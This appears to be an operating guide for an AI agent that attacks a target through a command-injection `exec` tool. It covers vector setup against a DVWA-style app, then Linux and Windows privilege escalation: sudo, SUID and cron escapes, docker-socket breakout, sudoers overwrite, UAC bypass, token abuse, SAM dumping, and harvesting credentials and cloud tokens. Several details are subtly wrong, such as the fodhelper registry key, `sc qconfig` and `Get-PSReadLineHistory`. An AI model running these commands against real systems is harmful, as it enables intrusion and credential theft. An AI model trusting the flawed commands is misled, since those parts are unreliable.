# Privilege escalation — post-foothold checklist

Run every command through the foothold via the `exec` tool: the command runs
on the target, never in the harness. Adapt quoting and encoding to the
injection point — when the vector mangles quotes, use `$(...)`-free forms,
base64 (`echo <b64> | base64 -d | sh`), or word-splitting (`/b/in/ash`).
On Windows, prefer single-quoted argument lists. If a command fails on
quoting, restate it flatter before moving on. Each section below is a
self-contained checklist: run it top to bottom, stop at the first success,
and record each step.

## Vector setup (exec registration)

The `exec` tool is stateful: a call carrying url, param and separator
registers it and verifies with `id`; every later call passes only
`command`. The vector is fixed only when verification finds its markers
— if the call returns the 8 KB body fallback (nothing executed), the
vector is not locked in: re-call with the corrected vector.

A vector needs everything the app requires:
- method, the injectable `param`, a `separator`, and a `value` prefix that
  keeps the app's own command intact (e.g. `127.0.0.1` for a ping field);
- `fields`: companion form fields the endpoint expects — most form endpoints
  run nothing unless the submit button is also posted (e.g. `Submit: Submit`);
- `headers`: the session `Cookie` plus app-state cookies (a DVWA-style
  `security=low` level cookie). The tools keep no cookies between calls, and
  the session Cookie must come from the app's own `Set-Cookie` after a real
  login — a fabricated ID authenticates nothing; the page keeps serving the
  login form.

Order matters: log in first; confirm the injection with one `http_request`
POSTing the complete form (all fields + cookies) with an inert payload —
the output must echo; only then register `exec` with the same url, param,
separator, value, fields and headers.

No markers in the response? Re-check in order: a missing companion form
field (submit button); a missing or fabricated session Cookie; app state
(security level, feature toggle); a blocked separator (try `;`, `|`, `&&`,
backticks); output filtering (inspect the raw body via `http_request`).

## Linux

### Escalation order (checklist)

Work in this order — cheap and likely first:

1. Identity and groups: `id`, `whoami`, `cat /etc/passwd | grep -v nologin` —
   group membership often reveals the route (docker, sudo, wheel, adm).
2. `sudo -l` — every permitted command is a candidate (see the sudo section).
3. Harvest what you already sit on: `env`, `~/.bash_history`, `~/.ssh/`,
   `cat /etc/shadow` (if readable), files in the current directory.
4. SUID/capabilities: `find / -perm -4000 -type f 2>/dev/null`,
   `getcap -r / 2>/dev/null` (see the SUID section).
5. Writable root files: `find / -xdev -writable -type f 2>/dev/null` —
   spot-check for cron scripts, SUID binaries, `/etc/shadow`, configs.
6. Writable cron: spool locations, then the scripts and binaries they call
   (see the cron section).
7. Kernel: `uname -a` — compare against known local exploits.
8. Docker socket: `ls -la /var/run/docker.sock` — if accessible:
   `docker run -v /:/h --rm -it alpine chroot /h` (or `nsenter --target 1 --mount --uts --ipc --net --pid -- sh`).

### sudo

`sudo -l` is the highest-yield check. For every listed command:

- **NOPASSWD** entries first — no password needed.
- Direct shells: `sudo /bin/sh`, `sudo su`, `sudo python`, `sudo perl`,
  `sudo ruby`; `sudo awk` → `sudo awk 'BEGIN {system("/bin/sh")}'`.
- `sudo find / -name x -exec /bin/sh \;` — `-exec` runs any command.
- `sudo vim`/`vi`/`nano` → `:!/bin/sh`; `sudo less`/`more` → `!/bin/sh`.
- `sudo env EDITOR=/bin/sh $EDITOR` — when sudoers grants `setenv`.
- `sudo env LD_PRELOAD=/tmp/evil.so anycmd` — compile
  `void _init(){system("/bin/sh");}` (or `main` with a constructor);
  needs `setenv`.
- PATH injection: entries that are not absolute paths (e.g. `sudo sh`
  resolved via PATH) — drop your own `sh` in the first writable PATH
  directory (`echo 'cp /bin/sh /tmp/s' > /tmp/p && ...` is overkill — just
  `cp /bin/sh /tmp/sh` and point the tool's PATH argument at `/tmp` if
  allowed).
- `sudo tar cf /dev/null /dev/null --checkpoint=1
  --checkpoint-action=exec=/bin/sh`, `sudo nmap -iN -sP 127.0.0.1` (then
  `!sh` in the interactive prompt), `sudo exim`/`mutt` → `!sh`.
- Writable-output abuse: `sudo tee /etc/sudoers` → append
  `<user> ALL=(ALL) NOPASSWD: ALL`; `sudo dd of=/tmp/sh` + `sudo cp`.

Keep attempts minimal: one `sudo` invocation, no password spraying.

### SUID and capabilities

Enumerate, then match against the abusable list:

- `find / -perm -4000 -type f 2>/dev/null` — classic SUID binaries.
- `getcap -r / 2>/dev/null` — file capabilities on non-SUID binaries
  (`cap_setuid+ep` is direct escalation).
- Writable SUID binary: for each hit, `ls -la <bin>` — world-writable means
  replace it with your own.
- Writable SUID directory: `ls -ld <dir>` — group/world-writable without a
  sticky bit means you can swap the binary inside.
- Abusable binaries: `find` (`-exec /bin/sh \;`), `awk`, `vi`/`vim`
  (`:!/bin/sh`), `python`/`perl`/`ruby` (`-c 'import os;os.system("/bin/sh")'`),
  `env` (`env /bin/sh`), `dd` (write a SUID shell), `tar`
  (`--checkpoint-action=exec`), `less`/`more` (`!/bin/sh`), `nmap`
  (interactive `!sh`), `exim`/`mutt`/`mailx` (`!sh`), `bash`/`sh`
  (just run them — a SUID shell is a root shell).
- Unknown SUID binaries: `file <bin>`, `man <name>`; an unfamiliar SUID
  binary is the most promising lead — look for its documented escape.
- Capabilities: `cap_dac_read_search` = read /etc/shadow; `cap_setuid+ep`
  = calling the binary escalates.

### cron and scheduled tasks

- Spool locations, in order: `/etc/crontab`, `/etc/cron.d/*`,
  `/etc/cron.hourly`, `/etc/cron.daily`, `/etc/cron.weekly`,
  `/etc/cron.monthly`, `/var/spool/cron/crontabs/*`,
  `crontab -l` (and via `sudo -u <user> crontab -l` when allowed).
- For each entry ask three questions: Is the script writable? Is the binary
  it calls writable? Is the script's directory writable (no sticky bit)?
- PATH shadowing: entries that call bare names (`foo`, not `/usr/bin/foo`)
  — create `foo` in the first writable PATH directory with your payload.
- Wildcards: `cd /; tar cvf root.tar *` expands `*` in the current
  directory — name your payload so it sorts first (e.g. `.tar` variants).
- `at` jobs: `atq`, then `/var/spool/cron/atjobs/*` — same writable-binary
  logic.
- systemd timers (modern distros): `systemctl list-timers` plus the unit
  files they point at — check the ExecStart script for writability.

## Windows

### Token abuse

- `whoami /all` — the full privilege list (the quick view is
  `whoami /priv`). The privilege list decides which path below works.
- **SeImpersonatePrivilege** (interactive services): impersonate any
  authenticated user up to the highest logon — JuicyPotatoNG,
  PrintSpoofer, GodPotato. Prefer a known tool over hand-rolled
  MSHTA/COM one-liners, which are fragile across builds.
- **SeAssignPrimaryTokenPrivilege**: spawn a process with SYSTEM's primary
  token (PrintSpoofer's path; GodPotato relies on it).
- **SeBackupPrivilege / SeRestorePrivilege**: read any file including the
  SAM hive — `vssadmin create shadow`, copy
  `\\?\C:\Windows\WinSxS\...\ntds.dit`-style hives, or
  `reg save hklm\sam C:\sam.hiv`.
- NtAdjustTokenPrivileges: enable a privilege you already own (e.g.
  SeTakeOwnership on a locked file) via a small P/Invoke (PowerShell
  Add-Type) — no privilege you don't have can be enabled.
- Pass-the-token: list and duplicate an elevated token from a running
  process (Incognito, or `mimikatz token::list` / `token::revert`) — you
  act as that identity locally without its password.
- UAC bypass (elevation without a second password): hijack a signed
  binary's registration — `fodhelper` (set
  `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UpgradeCode`
  to your payload), `eventvwr`, `sdclt` — then launch the signed binary.
- Record each success: re-run `whoami /all` and show the new token as
  evidence.

### Stored credentials

- SAM/SYSTEM offline: `reg save hklm\sam C:\sam.hiv` +
  `reg save hklm\system C:\system.hiv`, then crack (hashcat `-m 1000`,
  John `sam2john`).
- `cmdkey /list` — stored credentials, usable directly where accepted.
- `unattend.xml` / `sysprep.xml`: check `C:\Windows\Panther\unattend.xml`,
  `C:\Windows\System32\Sysprep\sysprep.xml`,
  `C:\Windows\Setup\Scripts\setupcomplete.cmd` — plain-text passwords in
  `<Password>` fields.
- Registry run keys: `reg query
  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` (and `RunOnce`),
  plus `Winlogon` `Userinit`/`Shell` — often point at scripts with
  embedded credentials.
- Browsers: Chrome/Edge `Login Data` + `Local State` (DPAPI-decrypt with
  the user's key in `C:\Users\<u>\AppData\Local\Microsoft\Crypto\RSA`),
  Firefox `logins.json`. PuTTY: `C:\Users\<u>\.putty\sessions\*` —
  plain-text passwords in the `.reg` files.
- Service configs: `sc qconfig <svc>` — a LocalSystem service reading a
  file you can write is code execution as that service; check
  `HKLM\SYSTEM\CurrentControlSet\Services\<svc>` `ImagePath` + `Start`.
- WinRM: `winrm e winrm/config` and
  `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WSMAN` — insecure
  setups store credentials in cleartext.
- PowerShell history: `Get-PSReadLineHistory | Select-String 'password'`,
  plus `C:\Users\<u>\AppData\Local\Microsoft\Windows\PowerShell\
  PSReadLineConsoleHost\*`.
- Cloud and local tokens: `~/.aws/credentials`, `az`/`gcloud` config
  files, `C:\Users\<u>\.docker\config.json` — same harvest logic as Linux.
